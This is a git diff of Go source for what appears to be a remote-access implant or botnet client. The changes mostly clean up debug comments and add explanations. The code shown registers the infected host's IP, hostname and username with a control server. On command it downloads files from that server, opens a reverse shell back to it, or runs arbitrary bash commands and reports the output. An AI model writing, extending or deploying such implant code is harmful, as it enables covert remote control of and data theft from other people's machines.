@@ -80,8 +80,6 @@ func firstContact() string {
 func register(registerkey string, ip string, os_name string, user string) bool {
 	endpoint := URL + "/register"
 
-	//fmt.Println(ip, user.Username, os_name)
-
 	var data = url.Values{
 		"registerkey": {registerkey},
 		"ip":          {ip},
@@ -159,10 +157,6 @@ func reverseshell(serverip string, port string) {
 }
 
 func download(endpoint string, destination string) (err error) {
-	//filename := path.Base(endpoint)
-	//var data = url.Values{
-	//	"registerkey": {registerkey}}
-
 	resp, err := http.Get(endpoint)
 	if err != nil {
 		return
@@ -194,15 +188,20 @@ func executeCommand(command string) string {
 	//}
 	commandSlice := strings.Split(command, " ")
 
+	// Download file and save it into the local disk
 	if commandSlice[0] == "download" {
 		fmt.Println("implement download here ")
 		endpoint := URL + "/download/" + commandSlice[1]
 		download(endpoint, commandSlice[2])
 		return ""
+
+		// Launch a reverse shell
 	} else if commandSlice[0] == "shell" {
 		port := commandSlice[1]
 		go reverseshell(SERVERIP, port)
 		return ""
+
+		// Execute a simple bash command, and return the output to /result endpoint
 	} else {
 		out, err := exec.Command("/bin/bash", "-c", command).CombinedOutput()
 		if err != nil {
@@ -213,8 +212,6 @@ func executeCommand(command string) string {
 }
 
 func main() {
-	// for debugging purposes
-	//var _ = fmt.Printf
 	ip := GetOutboundIP()
 	user, _ := user.Current()
 	os_name, _ := os.Hostname()
@@ -224,7 +221,6 @@ func main() {
 	fmt.Println("Reigster key = ", registerkey)
 
 	register_result := register(registerkey, ip, os_name, username)
-	//heartbeat_result := heartbeat(registerkey, ip, username)
 
 	// Register was not successful. Exit.
 	if register_result == false {
